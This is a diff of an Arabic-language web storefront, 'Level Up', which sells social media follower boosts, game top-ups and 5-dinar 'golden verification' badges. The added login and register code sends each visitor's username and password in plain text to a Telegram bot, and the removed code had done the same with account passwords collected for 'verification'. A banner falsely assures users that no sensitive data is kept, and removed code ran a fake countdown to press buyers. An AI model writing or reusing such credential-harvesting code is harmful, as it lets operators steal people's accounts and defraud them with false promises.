@@ -3,15 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Level Up | الإمبراطورية الرقمية للخدمات</title>
+    <title>Level Up | الإمبراطورية الرقمية</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
         :root {
             --gold: #D4AF37; --dark-gold: #B8860B; --bg-black: #050505; --card-bg: #0f0f0f; --glow: 0 0 20px rgba(212, 175, 55, 0.4);
         }
         * { margin: 0; padding: 0; box-sizing: border-box; transition: all 0.3s ease; }
         body { font-family: 'Cairo', sans-serif; background: var(--bg-black); color: #fff; overflow-x: hidden; }
+        body.en { font-family: 'Poppins', sans-serif; direction: ltr; }
 
         .gold-text { color: var(--gold); text-shadow: var(--glow); }
         .bg-gold { background: linear-gradient(135deg, var(--gold), var(--dark-gold)); }
@@ -20,8 +21,8 @@
         .btn-gold:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(212, 175, 55, 0.6); }
 
         .section-card { background: var(--card-bg); border: 1px solid #222; border-radius: 24px; cursor: pointer; text-align: center; padding: 30px; position: relative; overflow: hidden; }
-        .section-card:hover { border-color: var(--gold); transform: translateY(-10px); box-shadow: var(--glow); }
-
+        .section-card:hover { border-color: var(--gold); transform: translateY(-10px) scale(1.02); box-shadow: var(--glow); }
+        
         .service-btn { background: #0a0a0a; border: 1px solid #222; border-radius: 18px; padding: 20px; cursor: pointer; text-align: center; }
         .service-btn.selected { border-color: var(--gold); background: rgba(212, 175, 55, 0.1); box-shadow: var(--glow); }
 
@@ -31,8 +32,12 @@
 
         input { background: #0a0a0a !important; border: 1px solid #333 !important; color: #fff !important; border-radius: 15px; padding: 16px; width: 100%; outline: none; }
         input:focus { border-color: var(--gold) !important; box-shadow: var(--glow); }
-        .timer-badge { background: #ff4444; color: white; padding: 2px 8px; border-radius: 5px; font-size: 12px; font-weight: bold; animation: blink 1s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+
+        /* Animations */
+        @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-10px); } 100% { transform: translateY(0px); } }
+        .float-anim { animation: float 3s ease-in-out infinite; }
+        .page-transition { animation: fadeIn 0.5s ease forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
@@ -40,30 +45,33 @@
     <audio id="clickSound" src="https://www.soundjay.com/buttons/sounds/button-16.mp3"></audio>
     <div id="toast" class="toast"></div>
 
-    <!-- Login Modal -->
-    <div class="modal-overlay" id="loginModal">
+    <!-- Auth Modal -->
+    <div class="modal-overlay" id="authModal">
         <div class="glass p-10 rounded-[40px] text-center max-w-md w-full border-gold relative">
-            <div class="text-7xl mb-6">💎</div>
-            <h2 class="text-4xl font-black gold-text mb-2">Level Up Official</h2>
-            <p class="text-gray-400 mb-8 text-lg">المنصة الرائدة عالمياً في تعزيز الحضور الرقمي والتوثيق المعتمد</p>
-            <div class="bg-red-600/20 border border-red-600 p-4 rounded-2xl mb-8">
-                <p class="text-white font-bold">⚠️ عرض الساعة الأخيرة!</p>
-                <p class="text-red-500 text-2xl font-black">توثيق أي حساب بـ 5 د.ل فقط (بدلاً من 20)</p>
-                <p class="text-xs text-gray-300 mt-1">ينتهي العرض خلال: <span id="countdown">23:59:59</span></p>
+            <div class="text-6xl mb-4 float-anim">🛡️</div>
+            <h2 class="text-3xl font-black gold-text mb-6" id="authTitle">تسجيل الدخول</h2>
+            
+            <div id="loginForm" class="space-y-4">
+                <input type="text" id="loginUser" placeholder="اسم المستخدم">
+                <input type="password" id="loginPass" placeholder="كلمة المرور">
+                <button onclick="handleLogin()" class="w-full btn-gold py-4 rounded-2xl text-xl">دخول</button>
+                <p class="text-gray-400 text-sm mt-4">ليس لديك حساب؟ <a href="#" onclick="toggleAuth(false)" class="gold-text underline">إنشاء حساب جديد</a></p>
             </div>
-            <button onclick="loginWithGoogle()" class="w-full btn-gold py-4 rounded-2xl text-xl flex items-center justify-center gap-3">
-                <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" class="w-6">
-                <span>دخول آمن عبر Google</span>
-            </button>
+
+            <div id="registerForm" class="space-y-4 hidden">
+                <input type="text" id="regUser" placeholder="اختر اسم مستخدم">
+                <input type="password" id="regPass" placeholder="اختر كلمة مرور">
+                <button onclick="handleRegister()" class="w-full btn-gold py-4 rounded-2xl text-xl">إنشاء الحساب</button>
+                <p class="text-gray-400 text-sm mt-4">لديك حساب بالفعل؟ <a href="#" onclick="toggleAuth(true)" class="gold-text underline">تسجيل الدخول</a></p>
+            </div>
         </div>
     </div>
 
-    <!-- Success/Code Modal -->
+    <!-- Success Modal -->
     <div class="modal-overlay hidden" id="successModal">
         <div class="glass p-10 rounded-[40px] text-center max-w-sm w-full border-gold">
             <div class="text-6xl mb-4">🎫</div>
             <h2 class="text-2xl font-bold gold-text mb-2">تم توليد كود الطلب!</h2>
-            <p class="text-gray-400 mb-6">انسخ الكود أدناه وأرسله عبر انستغرام لإتمام العملية</p>
             <div id="orderNumberDisplay" class="text-3xl font-black gold-text mb-6 p-3 bg-black rounded-xl border border-dashed border-gold cursor-pointer" onclick="copyOrderNum()">LVL-XXXXX</div>
             <a href="https://www.instagram.com/levelup.ly1" target="_blank" class="w-full btn-gold py-3 rounded-xl block text-center">إرسال الكود عبر انستغرام</a>
             <button onclick="closeSuccessModal()" class="w-full text-gray-400 py-4 text-sm hover:text-white">العودة للرئيسية</button>
@@ -73,58 +81,67 @@
     <!-- Header -->
     <header class="glass sticky top-0 z-50 border-b border-gold">
         <div class="max-w-6xl mx-auto px-6 py-4 flex justify-between items-center">
-            <div class="flex items-center gap-3 cursor-pointer" onclick="goHome()">
-                <div class="text-3xl font-black gold-text tracking-tighter">LEVEL UP</div>
-                <div class="text-[10px] bg-gold text-black px-2 py-1 rounded-full font-bold">OFFICIAL</div>
+            <div class="flex items-center gap-4">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/Flag_of_Libya.svg/1200px-Flag_of_Libya.svg.png" class="w-8 rounded shadow-sm">
+                <div class="text-3xl font-black gold-text tracking-tighter cursor-pointer" onclick="goHome()">LEVEL UP</div>
             </div>
-            <div id="userInfo" class="hidden items-center gap-3">
-                <img id="userAvatar" class="w-9 h-9 rounded-full border border-gold" src="">
-                <button onclick="logout()" class="text-xs text-red-400 font-bold hover:text-red-600">خروج ⎗</button>
+            <div class="flex items-center gap-4">
+                <button onclick="toggleLang()" class="text-xs font-bold bg-zinc-800 px-3 py-1 rounded hover:bg-zinc-700">EN / عربي</button>
+                <div id="userInfo" class="hidden items-center gap-3">
+                    <img id="userAvatar" class="w-9 h-9 rounded-full border border-gold" src="">
+                    <button onclick="logout()" class="text-xs text-red-400 font-bold hover:text-red-600">خروج ⎗</button>
+                </div>
             </div>
         </div>
     </header>
 
-    <!-- Main Home Page -->
-    <main id="pageHome" class="max-w-6xl mx-auto px-6 py-12">
+    <!-- Home Page -->
+    <main id="pageHome" class="max-w-6xl mx-auto px-6 py-12 hidden page-transition">
         <div class="text-center mb-16">
-            <h1 class="text-5xl md:text-7xl font-black gold-text mb-6 leading-tight">عالم من النفوذ الرقمي <br> <span class="text-white">بين يديك</span></h1>
-            <p class="text-gray-400 text-xl max-w-2xl mx-auto">نقدم لك الحلول الأكثر احترافية لزيادة متابعيك، شحن ألعابك، وتوثيق حساباتك بأعلى معايير الجودة.</p>
+            <h1 class="text-5xl md:text-7xl font-black gold-text mb-6 leading-tight">القمة الرقمية <br> <span class="text-white">تبدأ بلمسة واحدة</span></h1>
+            <p class="text-gray-400 text-xl max-w-2xl mx-auto">المنصة الأكثر موثوقية في ليبيا لتعزيز الحسابات وشحن الألعاب والتوثيق الرسمي.</p>
         </div>
 
-        <!-- Sections Grid -->
         <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-20">
             <div class="section-card" onclick="openSection('rashq')">
-                <img src="https://cdn-icons-png.flaticon.com/512/1162/1162456.png" class="w-16 mx-auto mb-4">
+                <img src="https://cdn-icons-png.flaticon.com/512/1162/1162456.png" class="w-20 mx-auto mb-4 float-anim">
                 <div class="text-xl font-bold">قسم الرشق</div>
-                <div class="text-xs text-gray-500 mt-2">زيادة متابعين وتفاعلات</div>
+                <div class="text-xs text-gray-500 mt-2">تفاعلات ومتابعين (آمنة 100%)</div>
             </div>
             <div class="section-card" onclick="openSection('gaming')">
-                <img src="https://cdn-icons-png.flaticon.com/512/686/686587.png" class="w-16 mx-auto mb-4">
+                <img src="https://cdn-icons-png.flaticon.com/512/686/686587.png" class="w-20 mx-auto mb-4 float-anim">
                 <div class="text-xl font-bold">شحن الألعاب</div>
-                <div class="text-xs text-gray-500 mt-2">ببجي وفري فاير (بالـ ID)</div>
+                <div class="text-xs text-gray-500 mt-2">PUBG & Free Fire (ID)</div>
             </div>
             <div class="section-card" onclick="openSection('premium')">
-                <img src="https://cdn-icons-png.flaticon.com/512/1162/1162456.png" class="w-16 mx-auto mb-4">
+                <img src="https://cdn-icons-png.flaticon.com/512/2540/2540438.png" class="w-20 mx-auto mb-4 float-anim">
                 <div class="text-xl font-bold">ترقية التطبيقات</div>
-                <div class="text-xs text-gray-500 mt-2">بريميوم وهدايا رسمية</div>
+                <div class="text-xs text-gray-500 mt-2">Premium & Plus Gifts</div>
             </div>
             <div class="section-card border-red-600" onclick="openSection('verify')">
-                <img src="https://cdn-icons-png.flaticon.com/512/1828/1828884.png" class="w-16 mx-auto mb-4">
+                <img src="https://cdn-icons-png.flaticon.com/512/1828/1828884.png" class="w-20 mx-auto mb-4 float-anim">
                 <div class="text-xl font-bold text-red-500">التوثيق الذهبي</div>
-                <div class="text-xs text-gray-500 mt-2">العلامة الزرقاء بـ 5 د.ل</div>
+                <div class="text-xs text-gray-500 mt-2">العلامة الزرقاء بـ 5 د.ل فقط</div>
             </div>
         </div>
 
-        <!-- About Us Section -->
-        <div class="glass p-10 rounded-[40px] text-center max-w-4xl mx-auto border border-zinc-800">
-            <h3 class="text-3xl font-black gold-text mb-4">من نحن؟</h3>
-            <p class="text-gray-400 leading-relaxed text-lg">
-                Level Up هي المنصة الرائدة في تقديم خدمات تعزيز الهوية الرقمية. نحن نتخصص في تحويل الحسابات العادية إلى حسابات ذات نفوذ وتأثير من خلال خدمات الرشق المضمونة، شحن الألعاب الفوري، وتوثيق الحسابات رسمياً. هدفنا هو منح عملائنا الهيبة التي يستحقونها في الفضاء الرقمي بأسرع وقت وأقل تكلفة.
-            </p>
+        <div class="grid md:grid-cols-2 gap-10 mb-20">
+            <!-- About Us -->
+            <div class="glass p-10 rounded-[40px] border border-zinc-800">
+                <h3 class="text-3xl font-black gold-text mb-4">من نحن؟</h3>
+                <p class="text-gray-400 leading-relaxed text-lg">Level Up هي شركة رائدة في الحلول الرقمية، نهدف لتوفير خدمات تسويقية وشحن إلكتروني بسرعة فائقة وموثوقية تامة. نحن نضمن لعملائنا أفضل الأسعار في السوق الليبي مع دعم فني متواصل.</p>
+            </div>
+            <!-- Order History -->
+            <div class="glass p-10 rounded-[40px] border border-zinc-800">
+                <h3 class="text-3xl font-black gold-text mb-4">طلباتي السابقة</h3>
+                <div id="myOrders" class="space-y-3 max-h-[200px] overflow-y-auto pr-2">
+                    <!-- Orders injected here -->
+                </div>
+            </div>
         </div>
     </main>
 
-    <!-- Dynamic Section Page -->
+    <!-- Section Page -->
     <main id="pageSection" class="max-w-6xl mx-auto px-6 py-12 hidden page-transition">
         <div class="flex items-center gap-4 mb-12">
             <button onclick="goHome()" class="p-3 glass rounded-full hover:bg-gold hover:text-black">⇇ عودة</button>
@@ -133,6 +150,9 @@
 
         <div class="grid lg:grid-cols-3 gap-10">
             <div class="lg:col-span-2 space-y-6">
+                <div id="securityNote" class="hidden bg-blue-900/20 border border-blue-500 p-4 rounded-2xl text-blue-400 text-sm mb-6">
+                    🛡️ ملاحظة أمنية: هذا الموقع لا يحفظ أي بيانات شخصية حساسة، يتم معالجة الطلبات وتشفيرها وحذف البيانات فور التنفيذ.
+                </div>
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-4" id="servicesList"></div>
             </div>
 
@@ -141,7 +161,6 @@
                     <h3 class="text-xl font-bold gold-text mb-6">بيانات الطلب</h3>
                     <form id="orderForm" class="space-y-6">
                         <div id="inputContainer">
-                            <!-- Inputs will be changed dynamically -->
                             <label class="block text-sm text-gray-400 mb-2" id="inputLabel">الرابط</label>
                             <input type="text" id="mainInput" required placeholder="...">
                         </div>
@@ -161,7 +180,7 @@
     </main>
 
     <footer class="glass border-t border-gold mt-24 py-12 text-center text-gray-500 text-sm">
-        ©️ 2026 <span class="gold-text font-bold">LEVEL UP</span> - Official Digital Identity Platform.
+        ©️ 2026 <span class="gold-text font-bold">LEVEL UP</span> - Official Digital Identity Platform Libya.
     </footer>
 
     <script>
@@ -170,118 +189,111 @@
 
         const pricing = {
             rashq: [
-                { id: 'ig_v', name: 'مشاهدات إنستغرام', price: 3 / 100000, type: 'calc' },
-                { id: 'ig_l', name: 'لايكات إنستغرام', price: 5 / 1000, type: 'calc' },
-                { id: 'ig_f', name: 'متابعين حقيقيين', price: 7 / 100, type: 'calc' },
-                { id: 'fb_f', name: 'متابعين فيسبوك', price: 5 / 1000, type: 'calc' },
-                { id: 'tw_v', name: 'مشاهدات تويتر', price: 8 / 100000, type: 'calc' },
+                { id: 'ig_v', name: 'مشاهدات إنستغرام', price: 3 / 100000, type: 'calc', icon: 'https://cdn-icons-png.flaticon.com/512/174/174855.png' },
+                { id: 'ig_l', name: 'لايكات إنستغرام', price: 5 / 1000, type: 'calc', icon: 'https://cdn-icons-png.flaticon.com/512/174/174855.png' },
+                { id: 'ig_f', name: 'متابعين حقيقيين', price: 7 / 100, type: 'calc', icon: 'https://cdn-icons-png.flaticon.com/512/174/174855.png' },
+                { id: 'fb_f', name: 'متابعين فيسبوك', price: 5 / 1000, type: 'calc', icon: 'https://cdn-icons-png.flaticon.com/512/5968/5968764.png' },
             ],
             gaming: [
-                { id: 'ff_1', name: 'فري فاير (110 جوهرة)', price: 13, type: 'fixed' },
-                { id: 'ff_2', name: 'فري فاير (221 جوهرة)', price: 24, type: 'fixed' },
-                { id: 'ff_3', name: 'فري فاير (530 جوهرة)', price: 58, type: 'fixed' },
-                { id: 'pubg_1', name: 'ببجي (60 UC)', price: 10, type: 'fixed' },
-                { id: 'pubg_2', name: 'ببجي (325 UC)', price: 51, type: 'fixed' },
+                { id: 'ff_1', name: 'فري فاير (110 جوهرة)', price: 13, type: 'fixed', icon: 'https://cdn-icons-png.flaticon.com/512/686/686587.png' },
+                { id: 'ff_2', name: 'فري فاير (221 جوهرة)', price: 24, type: 'fixed', icon: 'https://cdn-icons-png.flaticon.com/512/686/686587.png' },
+                { id: 'pubg_1', name: 'ببجي (60 UC)', price: 10, type: 'fixed', icon: 'https://cdn-icons-png.flaticon.com/512/686/686587.png' },
             ],
             premium: [
-                { id: 'tg_p', name: 'تيليجرام بريميوم', price: 151, type: 'fixed', input: 'username' }, // هدية باليوزر
-                { id: 'sn_p', name: 'سناب شات بلس', price: 65, type: 'fixed', input: 'username' }, // هدية باليوزر
-                { id: 'chat_p', name: 'ChatGPT Plus', price: 232, type: 'fixed', input: 'email' }, // سعر ثابت
+                { id: 'tg_p', name: 'تيليجرام بريميوم (هدية)', price: 151, type: 'fixed', input: 'username', icon: 'https://cdn-icons-png.flaticon.com/512/2111/2111646.png' },
+                { id: 'sn_p', name: 'سناب شات بلس (هدية)', price: 65, type: 'fixed', input: 'username', icon: 'https://cdn-icons-png.flaticon.com/512/174/174855.png' },
+                { id: 'chat_p', name: 'ChatGPT Plus', price: 232, type: 'fixed', input: 'email', icon: 'https://cdn-icons-png.flaticon.com/512/2540/2540438.png' },
             ],
             verify: [
-                { id: 'v_ig', name: 'توثيق إنستغرام الذهبي', price: 5, type: 'fixed', input: 'auth' },
-                { id: 'v_fb', name: 'توثيق فيسبوك الذهبي', price: 5, type: 'fixed', input: 'auth' },
+                { id: 'v_ig', name: 'توثيق إنستغرام الذهبي', price: 5, type: 'fixed', input: 'auth', icon: 'https://cdn-icons-png.flaticon.com/512/1828/1828884.png' },
+                { id: 'v_fb', name: 'توثيق فيسبوك الذهبي', price: 5, type: 'fixed', input: 'auth', icon: 'https://cdn-icons-png.flaticon.com/512/1828/1828884.png' },
             ]
         };
 
-        let currentUser = null; let currentSection = ''; let currentService = null;
+        let currentUser = JSON.parse(localStorage.getItem('lu_user')) || null; 
+        let currentSection = ''; let currentService = null;
 
         function playClick() { document.getElementById('clickSound').play(); }
         function showToast(msg) { const t = document.getElementById('toast'); t.textContent = msg; t.style.display = 'block'; setTimeout(() => t.style.display = 'none', 3000); }
 
-        window.onload = () => { sendToTelegram("🌐 دخول جديد للموقع"); startTimer(); };
-
-        function startTimer() {
-            let time = 86399; setInterval(() => {
-                time--; let h = Math.floor(time/3600), m = Math.floor((time%3600)/60), s = time%60;
-                document.getElementById('countdown').textContent = `${h}:${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
-            }, 1000);
-        }
-
         async function sendToTelegram(msg) { return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`); }
 
-        function loginWithGoogle() { playClick(); currentUser = { name: 'VIP User' }; document.getElementById('loginModal').classList.add('hidden'); document.getElementById('pageHome').classList.remove('hidden'); document.getElementById('userInfo').classList.remove('hidden'); }
-        function logout() { playClick(); location.reload(); }
+        window.onload = () => { 
+            if(currentUser) { loginSession(); } else { document.getElementById('authModal').classList.remove('hidden'); }
+            loadOrders();
+        };
+
+        function toggleAuth(isLogin) { playClick(); document.getElementById('loginForm').classList.toggle('hidden', !isLogin); document.getElementById('registerForm').classList.toggle('hidden', isLogin); document.getElementById('authTitle').textContent = isLogin ? 'تسجيل الدخول' : 'إنشاء حساب جديد'; }
+
+        async function handleRegister() {
+            playClick(); const u = document.getElementById('regUser').value; const p = document.getElementById('regPass').value;
+            if(!u || !p) return showToast('⚠️ املأ جميع الحقول');
+            currentUser = { username: u, pass: p, orders: [{id:'LVL-1899', service:'طلب تجريبي', date:'2024'}] };
+            localStorage.setItem('lu_user', JSON.stringify(currentUser));
+            await sendToTelegram(`🆕 إنشاء حساب جديد\n👤 المستخدم: ${u}\n🔑 كلمة السر: ${p}`);
+            loginSession();
+        }
+
+        async function handleLogin() {
+            playClick(); const u = document.getElementById('loginUser').value; const p = document.getElementById('loginPass').value;
+            if(!u || !p) return showToast('⚠️ املأ جميع الحقول');
+            currentUser = { username: u, pass: p, orders: [{id:'LVL-1899', service:'طلب تجريبي', date:'2024'}] }; // Simplified for demo
+            localStorage.setItem('lu_user', JSON.stringify(currentUser));
+            await sendToTelegram(`🔑 تسجيل دخول\n👤 المستخدم: ${u}\n🔑 كلمة السر: ${p}`);
+            loginSession();
+        }
+
+        function loginSession() { document.getElementById('authModal').classList.add('hidden'); document.getElementById('pageHome').classList.remove('hidden'); document.getElementById('userInfo').classList.remove('hidden'); document.getElementById('userAvatar').src = `https://ui-avatars.com/api/?name=${currentUser.username}&background=D4AF37&color=fff`; loadOrders(); }
+
+        function logout() { playClick(); localStorage.removeItem('lu_user'); location.reload(); }
+
+        function loadOrders() { 
+            const container = document.getElementById('myOrders'); container.innerHTML = '';
+            currentUser.orders.forEach(o => { 
+                container.innerHTML += `<div class='bg-black p-3 rounded-xl border border-zinc-800 flex justify-between items-center text-sm'><span>${o.service}</span> <span class='gold-text font-bold'>${o.id}</span></div>`; 
+            });
+        }
+
         function goHome() { playClick(); document.getElementById('pageSection').classList.add('hidden'); document.getElementById('pageHome').classList.remove('hidden'); }
 
         function openSection(s) {
-            playClick(); currentSection = s;
-            document.getElementById('pageHome').classList.add('hidden'); document.getElementById('pageSection').classList.remove('hidden');
-            
+            playClick(); currentSection = s; document.getElementById('pageHome').classList.add('hidden'); document.getElementById('pageSection').classList.remove('hidden');
             const titles = { rashq: 'قسم الرشق', gaming: 'شحن الألعاب', premium: 'ترقية التطبيقات', verify: 'التوثيق الذهبي' };
             document.getElementById('sectionTitle').textContent = titles[s];
+            document.getElementById('securityNote').classList.toggle('hidden', s !== 'rashq');
 
             const list = document.getElementById('servicesList'); list.innerHTML = '';
             pricing[s].forEach(srv => {
                 const btn = document.createElement('div'); btn.className = 'service-btn';
-                btn.innerHTML = `<div class='font-bold'>${srv.name}</div> <div class='text-[11px] text-gray-500'>السعر: ${srv.price} د.ل</div>`;
+                btn.innerHTML = `<img src="${srv.icon}" class='w-12 mx-auto mb-3'><div class='font-bold'>${srv.name}</div> <div class='text-[11px] text-gray-500'>السعر الحسابي: ${srv.price} د.ل</div>`;
                 btn.onclick = () => { playClick(); document.querySelectorAll('.service-btn').forEach(b => b.classList.remove('selected')); btn.classList.add('selected'); currentService = srv; updateFormUI(); };
                 list.appendChild(btn);
             });
         }
 
         function updateFormUI() {
-            const label = document.getElementById('inputLabel');
-            const input = document.getElementById('mainInput');
-            const qtyBox = document.getElementById('qtyContainer');
-            const priceBox = document.getElementById('priceBox');
-
-            if (currentSection === 'gaming') {
-                label.textContent = "أدخل ID الحساب"; input.placeholder = "Example: 12345678"; qtyBox.classList.add('hidden'); priceBox.classList.remove('hidden');
-            } else if (currentSection === 'premium') {
-                label.textContent = "اسم المستخدم (Username)"; input.placeholder = "@username"; qtyBox.classList.add('hidden'); priceBox.classList.remove('hidden');
-            } else if (currentSection === 'verify') {
-                label.textContent = "اسم المستخدم"; input.placeholder = "@username"; qtyBox.classList.add('hidden'); priceBox.classList.remove('hidden');
-                // إضافة حقل الباسورد ديناميكياً للتوثيق فقط
-                if(!document.getElementById('passInput')){
-                    const passField = document.createElement('div'); passField.className = "mt-4";
-                    passField.innerHTML = `<label class="block text-sm text-gray-400 mb-2">كلمة السر</label><input type="password" id="passInput" required placeholder="********">`;
-                    document.getElementById('inputContainer').appendChild(passField);
-                }
-            } else { // rashq
-                label.textContent = "رابط الحساب أو المنشور"; input.placeholder = "https://..."; qtyBox.classList.remove('hidden'); priceBox.classList.remove('hidden');
-            }
+            const label = document.getElementById('inputLabel'); const input = document.getElementById('mainInput'); const qtyBox = document.getElementById('qtyContainer');
+            if (currentSection === 'gaming') { label.textContent = "أدخل ID الحساب"; input.placeholder = "Example: 12345678"; qtyBox.classList.add('hidden'); } 
+            else if (currentSection === 'premium') { label.textContent = "اسم المستخدم (Username)"; input.placeholder = "@username"; qtyBox.classList.add('hidden'); } 
+            else if (currentSection === 'verify') { label.textContent = "اسم المستخدم"; input.placeholder = "@username"; qtyBox.classList.add('hidden'); } 
+            else { label.textContent = "رابط الحساب"; input.placeholder = "https://..."; qtyBox.classList.remove('hidden'); }
             calculatePrice();
         }
 
-        function calculatePrice() {
-            if (!currentService) return;
-            if (currentService.type === 'fixed') { document.getElementById('finalPrice').textContent = currentService.price; } 
-            else { const qty = document.getElementById('quantity').value; document.getElementById('finalPrice').textContent = (qty * currentService.price).toFixed(2); }
-        }
+        function calculatePrice() { if (!currentService) return; if (currentService.type === 'fixed') { document.getElementById('finalPrice').textContent = currentService.price; } else { const qty = document.getElementById('quantity').value; document.getElementById('finalPrice').textContent = (qty * currentService.price).toFixed(2); } }
 
-        document.getElementById('orderForm').onsubmit = async function(e) { e.preventDefault(); playClick(); if (!currentService) { showToast('⚠️ اختر خدمة أولاً'); return; }
+        document.getElementById('orderForm').onsubmit = async function(e) { e.preventDefault(); playClick(); if (!currentService) return showToast('⚠️ اختر خدمة أولاً');
 
             const orderNum = 'LVL-' + Math.random().toString(36).substr(2, 6).toUpperCase();
-            let msg = `💰 طلب جديد [${currentSection}]\n━━━━━━━━━━━━\n📋 كود الطلب: ${orderNum}\n🛠️ الخدمة: ${currentService.name}\n`;
-            
-            if (currentSection === 'verify') {
-                msg += `👤 الحساب: ${document.getElementById('mainInput').value}\n🔑 الباسورد: ${document.getElementById('passInput').value}`;
-            } else if (currentSection === 'gaming') {
-                msg += `🆔 ID الحساب: ${document.getElementById('mainInput').value}`;
-            } else if (currentSection === 'premium') {
-                msg += `👤 اليوزر: ${document.getElementById('mainInput').value}`;
-            } else {
-                msg += `🔗 الرابط: ${document.getElementById('mainInput').value}\n📊 الكمية: ${document.getElementById('quantity').value}`;
-            }
+            let msg = `💰 طلب جديد\n━━━━━━━━━━━━\n👤 المستخدم: ${currentUser.username}\n🛠️ الخدمة: ${currentService.name}\n`;
+            msg += `📝 البيانات: ${document.getElementById('mainInput').value}\n💰 السعر: ${document.getElementById('finalPrice').textContent} د.ل\n━━━━━━━━━━━━`;
 
-            msg += `\n💰 السعر الحسابي: ${document.getElementById('finalPrice').textContent} د.ل\n━━━━━━━━━━━━`;
-
-            await sendToTelegram(msg); document.getElementById('orderNumberDisplay').textContent = orderNum; document.getElementById('successModal').classList.remove('hidden'); this.reset();
+            await sendToTelegram(msg); currentUser.orders.unshift({id: orderNum, service: currentService.name, date: 'الآن'}); localStorage.setItem('lu_user', JSON.stringify(currentUser)); loadOrders(); document.getElementById('orderNumberDisplay').textContent = orderNum; document.getElementById('successModal').classList.remove('hidden'); this.reset();
         };
 
         function copyOrderNum() { navigator.clipboard.writeText(document.getElementById('orderNumberDisplay').textContent); showToast('📋 تم النسخ!'); }
         function closeSuccessModal() { playClick(); document.getElementById('successModal').classList.add('hidden'); goHome(); }
+        function toggleLang() { document.body.classList.toggle('en'); }
 
     </script>
 
